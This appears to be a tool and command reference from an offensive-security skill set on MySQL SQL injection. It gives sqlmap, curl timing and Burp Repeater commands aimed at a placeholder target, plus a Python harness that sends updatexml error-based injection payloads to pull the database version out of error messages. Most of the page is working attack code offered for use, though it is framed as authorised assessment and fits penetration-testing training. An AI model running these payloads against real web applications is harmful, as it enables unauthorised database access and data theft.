# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`sql-injection-mysql-variants`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -o /dev/null -w '%{time_total}\n' 'https://target.example/products?id=7'` | Capture the elapsed-time baseline for a MySQL SLEEP differential | Cross-platform |
| `sqlmap` | `sqlmap -u 'https://target.example/products?id=7' --dbms=mysql --technique=BET --batch --level=1` | Confirm boolean, error, and time channels on MySQL while excluding stacked and file primitives | Linux, Windows, macOS |
| `mysql client` | `mysql -h target -e 'SELECT @@version'` | Confirm a MySQL or MariaDB backend and banner when direct access is in authorised scope | Linux, Windows, macOS |
| `Burp Suite Repeater` | `Send to Repeater and sequence the SLEEP five and SLEEP zero pair on one connection` | Keep the timing baseline and probe comparable so setup latency does not skew the delta | Cross-platform |

## Minimal Script Shape

A MySQL error-oracle harness: it sends a benign updatexml and a value-bearing updatexml to the same parameter and reports whether the marker-prefixed value surfaced in the error, indicating XPATH-based leakage.

```python
import urllib.error
import urllib.parse
import urllib.request

BASE = "https://target.example/products"
PARAM = "id"
MARKER = "~"


def body(value):
    url = BASE + "?" + urllib.parse.urlencode({PARAM: value})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", "replace")


benign = body("5 AND updatexml(1,concat(0x7e,0x61),1)")
probe = body("5 AND updatexml(1,concat(0x7e,(SELECT substring(@@version,1,4))),1)")
leaked = MARKER in probe and probe != benign
print({"marker_in_probe": MARKER in probe, "error_differential": leaked})
```
